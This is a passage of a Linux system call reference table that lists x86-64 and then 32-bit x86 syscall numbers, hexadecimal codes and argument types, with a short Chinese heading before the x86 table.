0x41 int semid struct sembuf *sops unsigned nsops 66 semctl 0x42 int semid int semnum int cmd 67 shmdt 0x43 char *shmaddr - - 68 msgget 0x44 key_t key int msgflg - 69 msgsnd 0x45 int msqid struct msgbuf *msgp size_t msgsz 70 msgrcv 0x46 int msqid struct msgbuf *msgp size_t msgsz 71 msgctl 0x47 int msqid int cmd struct msqid_ds *buf 72 fcntl 0x48 unsigned int fd unsigned int cmd unsigned long arg 73 flock 0x49 unsigned int fd unsigned int cmd - 74 fsync 0x4a unsigned int fd - - 75 fdatasync 0x4b unsigned int fd - - 76 truncate 0x4c const char *path long length - 77 ftruncate 0x4d unsigned int fd unsigned long length - 78 getdents 0x4e unsigned int fd struct linux_dirent *dirent unsigned int count 79 getcwd 0x4f char *buf unsigned long size - 80 chdir 0x50 const char *filename - - 81 fchdir 0x51 unsigned int fd - - 82 rename 0x52 const char *oldname const char *newname - 83 mkdir 0x53 const char *pathname umode_t mode - 84 rmdir 0x54 const char *pathname - - 85 creat 0x55 const char *pathname umode_t mode - 86 link 0x56 const char *oldname const char *newname - 87 unlink 0x57 const char *pathname - - 88 symlink 0x58 const char *old const char *new - 89 readlink 0x59 const char *path char *buf int bufsiz 90 chmod 0x5a const char *filename umode_t mode - 91 fchmod 0x5b unsigned int fd umode_t mode - 92 chown 0x5c const char *filename uid_t user gid_t group 93 fchown 0x5d unsigned int fd uid_t user gid_t group 94 lchown 0x5e const char *filename uid_t user gid_t group 95 umask 0x5f int mask - - 96 gettimeofday 0x60 struct __kernel_old_timeval *tv struct timezone *tz - 97 getrlimit 0x61 unsigned int resource struct rlimit *rlim - 98 getrusage 0x62 int who struct rusage *ru - 99 sysinfo 0x63 struct sysinfo *info - - 100 times 0x64 struct tms *tbuf - - 101 ptrace 0x65 long request long pid unsigned long addr 102 getuid 0x66 - - - 103 syslog 0x67 int type char *buf int len 104 getgid 0x68 - - - 105 setuid 0x69 uid_t uid - - 106 setgid 0x6a gid_t gid - - 107 geteuid 0x6b - - - 108 getegid 0x6c - - - 109 setpgid 0x6d pid_t pid pid_t pgid - 110 getppid 0x6e - - - 111 getpgrp 0x6f - - - 112 setsid 0x70 - - - 113 setreuid 0x71 uid_t ruid uid_t euid - 114 setregid 0x72 gid_t rgid gid_t egid - 115 getgroups 0x73 int gidsetsize gid_t *grouplist - 116 setgroups 0x74 int gidsetsize gid_t *grouplist - 117 setresuid 0x75 uid_t ruid uid_t euid uid_t suid 118 getresuid 0x76 uid_t *ruid uid_t *euid uid_t *suid 119 setresgid 0x77 gid_t rgid gid_t egid gid_t sgid 120 getresgid 0x78 gid_t *rgid gid_t *egid gid_t *sgid 121 getpgid 0x79 pid_t pid - - 122 setfsuid 0x7a uid_t uid - - 123 setfsgid 0x7b gid_t gid - - 124 getsid 0x7c pid_t pid - - 125 capget 0x7d cap_user_header_t header cap_user_data_t dataptr - 126 capset 0x7e cap_user_header_t header const cap_user_data_t data - 127 rt_sigpending 0x7f sigset_t *set size_t sigsetsize - 128 rt_sigtimedwait 0x80 const sigset_t *uthese siginfo_t *uinfo const struct __kernel_timespec *uts 129 rt_sigqueueinfo 0x81 pid_t pid int sig siginfo_t *uinfo 130 rt_sigsuspend 0x82 sigset_t *unewset size_t sigsetsize - 131 sigaltstack 0x83 const struct sigaltstack *uss struct sigaltstack *uoss - 132 utime 0x84 char *filename struct utimbuf *times - 133 mknod 0x85 const char *filename umode_t mode unsigned dev 134 uselib 0x86 const char *library - - 135 personality 0x87 unsigned int personality - - 136 ustat 0x88 unsigned dev struct ustat *ubuf - 137 statfs 0x89 const char * path struct statfs *buf - 138 fstatfs 0x8a unsigned int fd struct statfs *buf - 139 sysfs 0x8b int option unsigned long arg1 unsigned long arg2 140 getpriority 0x8c int which int who - 141 setpriority 0x8d int which int who int niceval 142 sched_setparam 0x8e pid_t pid struct sched_param *param - 143 sched_getparam 0x8f pid_t pid struct sched_param *param - 144 sched_setscheduler 0x90 pid_t pid int policy struct sched_param *param 145 sched_getscheduler 0x91 pid_t pid - - 146 sched_get_priority_max 0x92 int policy - - 147 sched_get_priority_min 0x93 int policy - - 148 sched_rr_get_interval 0x94 pid_t pid struct __kernel_timespec *interval - 149 mlock 0x95 unsigned long start size_t len - 150 munlock 0x96 unsigned long start size_t len - 151 mlockall 0x97 int flags - - 152 munlockall 0x98 - - - 153 vhangup 0x99 - - - 154 modify_ldt 0x9a ? ? ? 155 pivot_root 0x9b const char *new_root const char *put_old - 156 _sysctl 0x9c ? ? ? 157 prctl 0x9d int option unsigned long arg2 unsigned long arg3 158 arch_prctl 0x9e ? ? ? 159 adjtimex 0x9f struct __kernel_timex *txc_p - - 160 setrlimit 0xa0 unsigned int resource struct rlimit *rlim - 161 chroot 0xa1 const char *filename - - 162 sync 0xa2 - - - 163 acct 0xa3 const char *name - - 164 settimeofday 0xa4 struct __kernel_old_timeval *tv struct timezone *tz - 165 mount 0xa5 char *dev_name char *dir_name char *type 166 umount2 0xa6 ? ? ? 167 swapon 0xa7 const char *specialfile int swap_flags - 168 swapoff 0xa8 const char *specialfile - - 169 reboot 0xa9 int magic1 int magic2 unsigned int cmd 170 sethostname 0xaa char *name int len - 171 setdomainname 0xab char *name int len - 172 iopl 0xac ? ? ? 173 ioperm 0xad unsigned long from unsigned long num int on 174 create_module 0xae ? ? ? 175 init_module 0xaf void *umod unsigned long len const char *uargs 176 delete_module 0xb0 const char *name_user unsigned int flags - 177 get_kernel_syms 0xb1 ? ? ? 178 query_module 0xb2 ? ? ? 179 quotactl 0xb3 unsigned int cmd const char *special qid_t id 180 nfsservctl 0xb4 ? ? ? 181 getpmsg 0xb5 ? ? ? 182 putpmsg 0xb6 ? ? ? 183 afs_syscall 0xb7 ? ? ? 184 tuxcall 0xb8 ? ? ? 185 security 0xb9 ? ? ? 186 gettid 0xba - - - 187 readahead 0xbb int fd loff_t offset size_t count 188 setxattr 0xbc const char *path const char *name const void *value 189 lsetxattr 0xbd const char *path const char *name const void *value 190 fsetxattr 0xbe int fd const char *name const void *value 191 getxattr 0xbf const char *path const char *name void *value 192 lgetxattr 0xc0 const char *path const char *name void *value 193 fgetxattr 0xc1 int fd const char *name void *value 194 listxattr 0xc2 const char *path char *list size_t size 195 llistxattr 0xc3 const char *path char *list size_t size 196 flistxattr 0xc4 int fd char *list size_t size 197 removexattr 0xc5 const char *path const char *name - 198 lremovexattr 0xc6 const char *path const char *name - 199 fremovexattr 0xc7 int fd const char *name - 200 tkill 0xc8 pid_t pid int sig - 201 time 0xc9 __kernel_old_time_t *tloc - - 202 futex 0xca u32 *uaddr int op u32 val 203 sched_setaffinity 0xcb pid_t pid unsigned int len unsigned long *user_mask_ptr 204 sched_getaffinity 0xcc pid_t pid unsigned int len unsigned long *user_mask_ptr 205 set_thread_area 0xcd ? ? ? 206 io_setup 0xce unsigned nr_reqs aio_context_t *ctx - 207 io_destroy 0xcf aio_context_t ctx - - 208 io_getevents 0xd0 aio_context_t ctx_id long min_nr long nr 209 io_submit 0xd1 aio_context_t long struct iocb 210 io_cancel 0xd2 aio_context_t ctx_id struct iocb *iocb struct io_event *result 211 get_thread_area 0xd3 ? ? ? 212 lookup_dcookie 0xd4 u64 cookie64 char *buf size_t len 213 epoll_create 0xd5 int size - - 214 epoll_ctl_old 0xd6 ? ? ? 215 epoll_wait_old 0xd7 ? ? ? 216 remap_file_pages 0xd8 unsigned long start unsigned long size unsigned long prot 217 getdents64 0xd9 unsigned int fd struct linux_dirent64 *dirent unsigned int count 218 set_tid_address 0xda int *tidptr - - 219 restart_syscall 0xdb - - - 220 semtimedop 0xdc int semid struct sembuf *sops unsigned nsops 221 fadvise64 0xdd int fd loff_t offset size_t len 222 timer_create 0xde clockid_t which_clock struct sigevent *timer_event_spec timer_t * created_timer_id 223 timer_settime 0xdf timer_t timer_id int flags const struct __kernel_itimerspec *new_setting 224 timer_gettime 0xe0 timer_t timer_id struct __kernel_itimerspec *setting - 225 timer_getoverrun 0xe1 timer_t timer_id - - 226 timer_delete 0xe2 timer_t timer_id - - 227 clock_settime 0xe3 clockid_t which_clock const struct __kernel_timespec *tp - 228 clock_gettime 0xe4 clockid_t which_clock struct __kernel_timespec *tp - 229 clock_getres 0xe5 clockid_t which_clock struct __kernel_timespec *tp - 230 clock_nanosleep 0xe6 clockid_t which_clock int flags const struct __kernel_timespec *rqtp 231 exit_group 0xe7 int error_code - - 232 epoll_wait 0xe8 int epfd struct epoll_event *events int maxevents 233 epoll_ctl 0xe9 int epfd int op int fd 234 tgkill 0xea pid_t tgid pid_t pid int sig 235 utimes 0xeb char *filename struct __kernel_old_timeval *utimes - 236 vserver 0xec ? ? ? 237 mbind 0xed unsigned long start unsigned long len unsigned long mode 238 set_mempolicy 0xee int mode const unsigned long *nmask unsigned long maxnode 239 get_mempolicy 0xef int *policy unsigned long *nmask unsigned long maxnode 240 mq_open 0xf0 const char *name int oflag umode_t mode 241 mq_unlink 0xf1 const char *name - - 242 mq_timedsend 0xf2 mqd_t mqdes const char *msg_ptr size_t msg_len 243 mq_timedreceive 0xf3 mqd_t mqdes char *msg_ptr size_t msg_len 244 mq_notify 0xf4 mqd_t mqdes const struct sigevent *notification - 245 mq_getsetattr 0xf5 mqd_t mqdes const struct mq_attr *mqstat struct mq_attr *omqstat 246 kexec_load 0xf6 unsigned long entry unsigned long nr_segments struct kexec_segment *segments 247 waitid 0xf7 int which pid_t pid struct siginfo *infop 248 add_key 0xf8 const char *_type const char *_description const void *_payload 249 request_key 0xf9 const char *_type const char *_description const char *_callout_info 250 keyctl 0xfa int cmd unsigned long arg2 unsigned long arg3 251 ioprio_set 0xfb int which int who int ioprio 252 ioprio_get 0xfc int which int who - 253 inotify_init 0xfd - - - 254 inotify_add_watch 0xfe int fd const char *path u32 mask 255 inotify_rm_watch 0xff int fd __s32 wd - 256 migrate_pages 0x100 pid_t pid unsigned long maxnode const unsigned long *from 257 openat 0x101 int dfd const char *filename int flags 258 mkdirat 0x102 int dfd const char * pathname umode_t mode 259 mknodat 0x103 int dfd const char * filename umode_t mode 260 fchownat 0x104 int dfd const char *filename uid_t user 261 futimesat 0x105 int dfd const char *filename struct __kernel_old_timeval *utimes 262 newfstatat 0x106 int dfd const char *filename struct stat *statbuf 263 unlinkat 0x107 int dfd const char * pathname int flag 264 renameat 0x108 int olddfd const char * oldname int newdfd 265 linkat 0x109 int olddfd const char *oldname int newdfd 266 symlinkat 0x10a const char * oldname int newdfd const char * newname 267 readlinkat 0x10b int dfd const char *path char *buf 268 fchmodat 0x10c int dfd const char * filename umode_t mode 269 faccessat 0x10d int dfd const char *filename int mode 270 pselect6 0x10e int fd_set * fd_set * 271 ppoll 0x10f struct pollfd * unsigned int struct __kernel_timespec * 272 unshare 0x110 unsigned long unshare_flags - - 273 set_robust_list 0x111 struct robust_list_head *head size_t len - 274 get_robust_list 0x112 int pid struct robust_list_head head_ptr size_t *len_ptr 275 splice 0x113 int fd_in loff_t *off_in int fd_out 276 tee 0x114 int fdin int fdout size_t len 277 sync_file_range 0x115 int fd loff_t offset loff_t nbytes 278 vmsplice 0x116 int fd const struct iovec *iov unsigned long nr_segs 279 move_pages 0x117 pid_t pid unsigned long nr_pages const void pages 280 utimensat 0x118 int dfd const char *filename struct __kernel_timespec *utimes 281 epoll_pwait 0x119 int epfd struct epoll_event *events int maxevents 282 signalfd 0x11a int ufd sigset_t *user_mask size_t sizemask 283 timerfd_create 0x11b int clockid int flags - 284 eventfd 0x11c unsigned int count - - 285 fallocate 0x11d int fd int mode loff_t offset 286 timerfd_settime 0x11e int ufd int flags const struct __kernel_itimerspec *utmr 287 timerfd_gettime 0x11f int ufd struct __kernel_itimerspec *otmr - 288 accept4 0x120 int struct sockaddr * int * 289 signalfd4 0x121 int ufd sigset_t *user_mask size_t sizemask 290 eventfd2 0x122 unsigned int count int flags - 291 epoll_create1 0x123 int flags - - 292 dup3 0x124 unsigned int oldfd unsigned int newfd int flags 293 pipe2 0x125 int *fildes int flags - 294 inotify_init1 0x126 int flags - - 295 preadv 0x127 unsigned long fd const struct iovec *vec unsigned long vlen 296 pwritev 0x128 unsigned long fd const struct iovec *vec unsigned long vlen 297 rt_tgsigqueueinfo 0x129 pid_t tgid pid_t pid int sig 298 perf_event_open 0x12a struct perf_event_attr *attr_uptr pid_t pid int cpu 299 recvmmsg 0x12b int fd struct mmsghdr *msg unsigned int vlen 300 fanotify_init 0x12c unsigned int flags unsigned int event_f_flags - 301 fanotify_mark 0x12d int fanotify_fd unsigned int flags u64 mask 302 prlimit64 0x12e pid_t pid unsigned int resource const struct rlimit64 *new_rlim 303 name_to_handle_at 0x12f int dfd const char *name struct file_handle *handle 304 open_by_handle_at 0x130 int mountdirfd struct file_handle *handle int flags 305 clock_adjtime 0x131 clockid_t which_clock struct __kernel_timex *tx - 306 syncfs 0x132 int fd - - 307 sendmmsg 0x133 int fd struct mmsghdr *msg unsigned int vlen 308 setns 0x134 int fd int nstype - 309 getcpu 0x135 unsigned *cpu unsigned *node struct getcpu_cache *cache 310 process_vm_readv 0x136 pid_t pid const struct iovec *lvec unsigned long liovcnt 311 process_vm_writev 0x137 pid_t pid const struct iovec *lvec unsigned long liovcnt 312 kcmp 0x138 pid_t pid1 pid_t pid2 int type 313 finit_module 0x139 int fd const char *uargs int flags 314 sched_setattr 0x13a pid_t pid struct sched_attr *attr unsigned int flags 315 sched_getattr 0x13b pid_t pid struct sched_attr *attr unsigned int size 316 renameat2 0x13c int olddfd const char *oldname int newdfd 317 seccomp 0x13d unsigned int op unsigned int flags void *uargs 318 getrandom 0x13e char *buf size_t count unsigned int flags 319 memfd_create 0x13f const char *uname_ptr unsigned int flags - 320 kexec_file_load 0x140 int kernel_fd int initrd_fd unsigned long cmdline_len 321 bpf 0x141 int cmd union bpf_attr *attr unsigned int size 322 execveat 0x142 int dfd const char *filename const char *const *argv 323 userfaultfd 0x143 int flags - - 324 membarrier 0x144 int cmd unsigned int flags int cpu_id 325 mlock2 0x145 unsigned long start size_t len int flags 326 copy_file_range 0x146 int fd_in loff_t *off_in int fd_out 327 preadv2 0x147 unsigned long fd const struct iovec *vec unsigned long vlen 328 pwritev2 0x148 unsigned long fd const struct iovec *vec unsigned long vlen 329 pkey_mprotect 0x149 unsigned long start size_t len unsigned long prot 330 pkey_alloc 0x14a unsigned long flags unsigned long init_val - 331 pkey_free 0x14b int pkey - - 332 statx 0x14c int dfd const char *path unsigned flags 333 not implemented 0x14d 334 not implemented 0x14e 335 not implemented 0x14f 336 not implemented 0x150 337 not implemented 0x151 338 not implemented 0x152 339 not implemented 0x153 340 not implemented 0x154 341 not implemented 0x155 342 not implemented 0x156 343 not implemented 0x157 344 not implemented 0x158 345 not implemented 0x159 346 not implemented 0x15a 347 not implemented 0x15b 348 not implemented 0x15c 349 not implemented 0x15d 350 not implemented 0x15e 351 not implemented 0x15f 352 not implemented 0x160 353 not implemented 0x161 354 not implemented 0x162 355 not implemented 0x163 356 not implemented 0x164 357 not implemented 0x165 358 not implemented 0x166 359 not implemented 0x167 360 not implemented 0x168 361 not implemented 0x169 362 not implemented 0x16a 363 not implemented 0x16b 364 not implemented 0x16c 365 not implemented 0x16d 366 not implemented 0x16e 367 not implemented 0x16f 368 not implemented 0x170 369 not implemented 0x171 370 not implemented 0x172 371 not implemented 0x173 372 not implemented 0x174 373 not implemented 0x175 374 not implemented 0x176 375 not implemented 0x177 376 not implemented 0x178 377 not implemented 0x179 378 not implemented 0x17a 379 not implemented 0x17b 380 not implemented 0x17c 381 not implemented 0x17d 382 not implemented 0x17e 383 not implemented 0x17f 384 not implemented 0x180 385 not implemented 0x181 386 not implemented 0x182 387 not implemented 0x183 388 not implemented 0x184 389 not implemented 0x185 390 not implemented 0x186 391 not implemented 0x187 392 not implemented 0x188 393 not implemented 0x189 394 not implemented 0x18a 395 not implemented 0x18b 396 not implemented 0x18c 397 not implemented 0x18d 398 not implemented 0x18e 399 not implemented 0x18f 400 not implemented 0x190 401 not implemented 0x191 402 not implemented 0x192 403 not implemented 0x193 404 not implemented 0x194 405 not implemented 0x195 406 not implemented 0x196 407 not implemented 0x197 408 not implemented 0x198 409 not implemented 0x199 410 not implemented 0x19a 411 not implemented 0x19b 412 not implemented 0x19c 413 not implemented 0x19d 414 not implemented 0x19e 415 not implemented 0x19f 416 not implemented 0x1a0 417 not implemented 0x1a1 418 not implemented 0x1a2 419 not implemented 0x1a3 420 not implemented 0x1a4 421 not implemented 0x1a5 422 not implemented 0x1a6 423 not implemented 0x1a7 424 not implemented 0x1a8 425 io_uring_setup 0x1a9 u32 entries struct io_uring_params *p - 426 io_uring_enter 0x1aa unsigned int fd u32 to_submit u32 min_complete 427 not implemented 0x1ab 428 not implemented 0x1ac 429 not implemented 0x1ad 430 not implemented 0x1ae 431 not implemented 0x1af 432 not implemented 0x1b0 433 not implemented 0x1b1 434 not implemented 0x1b2 435 not implemented 0x1b3 436 not implemented 0x1b4 437 not implemented 0x1b5 438 not implemented 0x1b6 439 faccessat2 0x1b7 int dfd const char *filename int mode x86系统调用表 NR syscall name %eax arg0 (%ebx) arg1 (%ecx) arg2 (%edx) 0 restart_syscall 0x00 - - - 1 exit 0x01 int error_code - - 2 fork 0x02 - - - 3 read 0x03 unsigned int fd char *buf size_t count 4 write 0x04 unsigned int fd const char *buf size_t count 5 open 0x05 const char *filename int flags umode_t mode 6 close 0x06 unsigned int fd - - 7 waitpid 0x07 pid_t pid int *stat_addr int options 8 creat 0x08 const char *pathname umode_t mode - 9 link 0x09 const char *oldname const char *newname - 10 unlink 0x0a const char *pathname - - 11 execve 0x0b const char *filename const char *const *argv const char *const *envp 12 chdir 0x0c const char *filename - - 13 time 0x0d __kernel_old_time_t *tloc - - 14 mknod 0x0e const char *filename umode_t mode unsigned dev 15 chmod 0x0f const char *filename umode_t mode - 16 lchown 0x10 const char *filename uid_t user gid_t group 17 break 0x11 ? ? ? 18 oldstat 0x12 ? ? ? 19 lseek 0x13 unsigned int fd off_t offset unsigned int whence 20 getpid 0x14 - - - 21 mount 0x15 char *dev_name char *dir_name char *type 22 umount 0x16 char *name int flags - 23 setuid 0x17 uid_t uid - - 24 getuid 0x18 - - - 25 stime 0x19 __kernel_old_time_t *tptr - - 26 ptrace 0x1a long request long pid unsigned long addr 27 alarm 0x1b unsigned int seconds - - 28 oldfstat 0x1c ? ? ? 29 pause 0x1d - - - 30 utime 0x1e char *filename struct utimbuf *times - 31 stty 0x1f ? ? ? 32 gtty 0x20 ? ? ? 33 access 0x21 const char *filename int mode - 34 nice 0x22 int increment - - 35 ftime 0x23 ? ? ? 36 sync 0x24 - - - 37 kill 0x25 pid_t pid int sig - 38 rename 0x26 const char *oldname const char *newname - 39 mkdir 0x27 const char *pathname umode_t mode - 40 rmdir 0x28 const char *pathname - - 41 dup 0x29 unsigned int fildes - - 42 pipe 0x2a int *fildes - - 43 times 0x2b struct tms *tbuf - - 44 prof 0x2c ? ? ? 45 brk 0x2d unsigned long brk - - 46 setgid 0x2e gid_t gid - - 47 getgid 0x2f - - - 48 signal 0x30 int sig __sighandler_t handler - 49 geteuid 0x31 - - - 50 getegid 0x32 - - - 51 acct 0x33 const char *name - - 52 umount2 0x34 ? ? ? 53 lock 0x35 ? ? ? 54 ioctl 0x36 unsigned int fd unsigned int cmd unsigned long arg 55 fcntl 0x37 unsigned int fd unsigned int cmd unsigned long arg 56 mpx 0x38 ? ? ? 57 setpgid 0x39 pid_t pid pid_t pgid - 58 ulimit 0x3a ? ? ? 59 oldolduname 0x3b ? ? ? 60 umask 0x3c int mask - - 61 chroot 0x3d const char *filename - - 62 ustat 0x3e unsigned dev struct ustat *ubuf - 63 dup2 0x3f unsigned int oldfd unsigned int newfd - 64 getppid 0x40 - - - 65 getpgrp 0x41 - - - 66 setsid 0x42 - - - 67 sigaction 0x43 int const struct old_sigaction * struct old_sigaction * 68 sgetmask 0x44 - - - 69 ssetmask 0x45 int newmask - - 70 setreuid 0x46 uid_t ruid uid_t euid - 71 setregid 0x47 gid_t rgid gid_t egid - 72 sigsuspend 0x48 int unused1 int unused2 old_sigset_t mask 73 sigpending 0x49 old_sigset_t *uset - - 74 sethostname 0x4a char *name int len - 75 setrlimit 0x4b unsigned int resource struct rlimit *rlim - 76 getrlimit 0x4c unsigned int resource struct rlimit *rlim - 77 getrusage 0x4d int who struct rusage *ru - 78 gettimeofday 0x4e struct __kernel_old_timeval *tv struct timezone *tz - 79 settimeofday 0x4f struct __kernel_old_timeval *tv struct timezone *tz - 80 getgroups 0x50 int gidsetsize gid_t *grouplist - 81 setgroups 0x51 int gidsetsize gid_t *grouplist - 82 select 0x52 int n fd_set *inp fd_set *outp 83 symlink 0x53 const char *old const char *new - 84 oldlstat 0x54 ? ? ? 85 readlink 0x55 const char *path char *buf int bufsiz 86 uselib 0x56 const char *library - - 87 swapon 0x57 const char *specialfile int swap_flags - 88 reboot 0x58 int magic1 int magic2 unsigned int cmd 89 readdir 0x59 ? ? ? 90 mmap 0x5a ? ? ? 91 munmap 0x5b unsigned long addr size_t len - 92 truncate 0x5c const char *path long length - 93 ftruncate 0x5d unsigned int fd unsigned long length - 94 fchmod 0x5e unsigned int fd umode_t mode - 95 fchown 0x5f unsigned int fd uid_t user gid_t group 96 getpriority 0x60 int which int who - 97 setpriority 0x61 int which int who int niceval 98 profil 0x62 ? ? ? 99 statfs 0x63 const char * path struct statfs *buf - 100 fstatfs 0x64 unsigned int fd struct statfs *buf - 101 ioperm 0x65 unsigned long from unsigned long num int on 102 socketcall 0x66 int call unsigned long *args - 103 syslog 0x67 int type char *buf int len 104 setitimer 0x68 int which struct __kernel_old_itimerval *value struct __kernel_old_itimerval *ovalue 105 getitimer 0x69 int which struct __kernel_old_itimerval *value - 106 stat 0x6a const char *filename struct __old_kernel_stat *statbuf - 107 lstat 0x6b const char *filename struct __old_kernel_stat *statbuf - 108 fstat 0x6c unsigned int fd struct __old_kernel_stat *statbuf - 109 olduname 0x6d struct oldold_utsname * - - 110 iopl 0x6e ? ? ? 111 vhangup 0x6f - - - 112 idle 0x70 ? ? ? 113 vm86old 0x71 ? ? ? 114 wait4 0x72 pid_t pid int *stat_addr int options 115 swapoff 0x73 const char *specialfile - - 116 sysinfo 0x74 struct sysinfo *info - - 117 ipc 0x75 unsigned int call int first unsigned long second 118 fsync 0x76 unsigned int fd - - 119 sigreturn 0x77 ? ? ? 120 clone 0x78 unsigned long unsigned long int * 121 setdomainname 0x79 char *name int len - 122 uname 0x7a struct old_utsname * - - 123 modify_ldt 0x7b ? ? ? 124 adjtimex 0x7c struct __kernel_timex *txc_p - - 125 mprotect 0x7d unsigned long start size_t len unsigned long prot 126 sigprocmask 0x7e int how old_sigset_t *set old_sigset_t *oset 127 create_module 0x7f ? ? ? 128 init_module 0x80 void *umod unsigned long len const char *uargs 129 delete_module 0x81 const char *name_user unsigned int flags - 130 get_kernel_syms 0x82 ? ? ? 131 quotactl 0x83 unsigned int cmd const char *special qid_t id 132 getpgid 0x84 pid_t pid - - 133 fchdir 0x85 unsigned int fd - - 134 bdflush 0x86 ? ? ? 135 sysfs 0x87 int option unsigned long arg1 unsigned long arg2 136 personality 0x88 unsigned int personality - - 137 afs_syscall 0x89 ? ? ? 138 setfsuid 0x8a uid_t uid - - 139 setfsgid 0x8b gid_t gid - - 140 _llseek 0x8c ? ? ? 141 getdents 0x8d unsigned int fd struct linux_dirent *dirent unsigned int count 142 _newselect 0x8e ? ? ? 143 flock 0x8f unsigned int fd unsigned int cmd - 144 msync 0x90 unsigned long start size_t len int flags 145 readv 0x91 unsigned long fd const struct iovec *vec unsigned long vlen 146 writev 0x92 unsigned long fd const struct iovec *vec unsigned long vlen 147 getsid 0x93 pid_t pid - - 148 fdatasync 0x94 unsigned int fd - - 149 _sysctl 0x95 ? ? ? 150 mlock 0x96 unsigned long start size_t len - 151 munlock 0x97 unsigned long start size_t len - 152 mlockall 0x98 int flags - - 153 munlockall 0x99 - - - 154 sched_setparam 0x9a pid_t pid struct sched_param *param - 155 sched_getparam 0x9b pid_t pid struct sched_param *param - 156 sched_setscheduler 0x9c pid_t pid int policy struct sched_param *param 157 sched_getscheduler 0x9d pid_t pid - - 158 sched_yield 0x9e - - - 159 sched_get_priority_max 0x9f int policy - - 160 sched_get_priority_min 0xa0 int policy - - 161 sched_rr_get_interval 0xa1 pid_t pid struct __kernel_timespec *interval - 162 nanosleep 0xa2 struct __kernel_timespec *rqtp struct __kernel_timespec *rmtp - 163 mremap 0xa3 unsigned long addr unsigned long old_len unsigned long new_len 164 setresuid 0xa4 uid_t ruid uid_t euid uid_t suid 165 getresuid 0xa5 uid_t *ruid uid_t *euid uid_t *suid 166 vm86 0xa6 ? ? ? 167 query_module 0xa7 ? ? ? 168 poll 0xa8 struct pollfd *ufds unsigned int nfds int timeout 169 nfsservctl 0xa9 ? ? ? 170 setresgid 0xaa gid_t rgid gid_t egid gid_t sgid 171 getresgid 0xab gid_t *rgid gid_t *egid gid_t *sgid 172 prctl 0xac int option unsigned long arg2 unsigned long arg3 173 rt_sigreturn 0xad ? ? ? 174 rt_sigaction 0xae int const struct sigaction * struct sigaction * 175 rt_sigprocmask 0xaf int how sigset_t *set sigset_t *oset 176 rt_sigpending 0xb0 sigset_t *set size_t sigsetsize - 177 rt_sigtimedwait 0xb1 const sigset_t *uthese siginfo_t *uinfo const struct __kernel_timespec *uts 178 rt_sigqueueinfo 0xb2 pid_t pid int sig siginfo_t *uinfo 179 rt_sigsuspend 0xb3 sigset_t *unewset size_t sigsetsize - 180 pread64 0xb4 unsigned int fd char *buf size_t count 181 pwrite64 0xb5 unsigned int fd const char *buf size_t count 182 chown 0xb6 const char *filename uid_t user gid_t group 183 getcwd 0xb7 char *buf unsigned long size - 184 capget 0xb8 cap_user_header_t header cap_user_data_t dataptr - 185 capset 0xb9 cap_user_header_t header const cap_user_data_t data - 186 sigaltstack 0xba const struct sigaltstack *uss struct sigaltstack *uoss - 187 sendfile 0xbb int out_fd int in_fd off_t *offset 188 getpmsg 0xbc ? ? ? 189 putpmsg 0xbd ? ? ? 190 vfork 0xbe - - - 191 ugetrlimit 0xbf ? ? ? 192 mmap2 0xc0 ? ? ? 193 truncate64 0xc1 const char *path loff_t length - 194 ftruncate64 0xc2 unsigned int fd loff_t length - 195 stat64 0xc3 const char *filename struct stat64 *statbuf - 196 lstat64 0xc4 const char *filename struct stat64 *statbuf - 197 fstat64 0xc5 unsigned long fd struct stat64 *statbuf - 198 lchown32 0xc6 ? ? ? 199 getuid32 0xc7 ? ? ? 200 getgid32 0xc8 ? ? ? 201 geteuid32 0xc9 ? ? ? 202 getegid32 0xca ? ? ? 203 setreuid32 0xcb ? ? ? 204 setregid32 0xcc ? ? ? 205 getgroups32 0xcd ? ? ? 206 setgroups32 0xce ? ? ? 207 fchown32 0xcf ? ? ? 208 setresuid32 0xd0 ? ? ? 209 getresuid32 0xd1 ? ? ? 210 setresgid32 0xd2 ? ? ? 211 getresgid32 0xd3 ? ? ? 212 chown32 0xd4 ? ? ? 213 setuid32 0xd5 ? ? ? 214 setgid32 0xd6 ? ? ? 215 setfsuid32 0xd7 ? ? ? 216 setfsgid32 0xd8 ? ? ? 217 pivot_root 0xd9 const char *new_root const char *put_old - 218 mincore 0xda unsigned long start size_t len unsigned char * vec 219 madvise 0xdb unsigned long start size_t len int behavior 220 getdents64 0xdc unsigned int fd struct linux_dirent64 *dirent unsigned int count 221 fcntl64 0xdd unsigned int fd unsigned int cmd unsigned long arg 222 not implemented 0xde 223 not implemented 0xdf 224 gettid 0xe0 - - - 225 readahead 0xe1 int fd loff_t offset size_t count 226 setxattr 0xe2 const char *path const char *name const void *value 227 lsetxattr 0xe3 const char *path const char *name const void *value 228 fsetxattr 0xe4 int fd const char *name const void *value 229 getxattr 0xe5 const char *path const char *name void *value 230 lgetxattr 0xe6 const char *path const char *name void *value 231 fgetxattr 0xe7 int fd const char *name void *value 232 listxattr 0xe8 const char *path char *list size_t size 233 llistxattr 0xe9 const char *path char *list size_t size 234 flistxattr 0xea int fd char *list size_t size 235 removexattr 0xeb const char *path const char *name - 236 lremovexattr 0xec const char *path const char *name - 237 fremovexattr 0xed int fd const char *name - 238 tkill 0xee pid_t pid int sig - 239 sendfile64 0xef int out_fd int in_fd loff_t *offset 240 futex 0xf0 u32 *uaddr int op u32 val 241 sched_setaffinity 0xf1 pid_t pid unsigned int len unsigned long *user_mask_ptr 242 sched_getaffinity 0xf2 pid_t pid unsigned int len unsigned long *user_mask_ptr 243 set_thread_area 0xf3 ? ? ? 244 get_thread_area 0xf4 ? ? ? 245 io_setup 0xf5 unsigned nr_reqs aio_context_t *ctx - 246 io_destroy 0xf6 aio_context_t ctx - - 247 io_getevents 0xf7 aio_context_t ctx_id long min_nr long nr 248 io_submit 0xf8 aio_context_t long struct iocb 249 io_cancel 0xf9 aio_context_t ctx_id struct iocb *iocb struct io_event *result 250 fadvise64 0xfa int fd loff_t offset size_t len 251 not implemented 0xfb 252 exit_group 0xfc int error_code - - 253 lookup_dcookie 0xfd u64 cookie64 char *buf size_t len 254 epoll_create 0xfe int size - - 255 epoll_ctl 0xff int epfd int op int fd 256 epoll_wait 0x100 int epfd struct epoll_event *events int maxevents 257 remap_file_pages 0x101 unsigned long start unsigned long size unsigned long prot 258 set_tid_address 0x102 int *tidptr - - 259 timer_create 0x103 clockid_t which_clock struct sigevent *timer_event_spec timer_t * created_timer_id 260 timer_settime 0x104 timer_t timer_id int flags const struct __kernel_itimerspec *new_setting 261 timer_gettime 0x105 timer_t timer_id struct __kernel_itimerspec *setting - 262 timer_getoverrun 0x106 timer_t timer_id - - 263 timer_delete 0x107 timer_t timer_id - - 264 clock_settime 0x108 clockid_t which_clock const struct __kernel_timespec *tp - 265 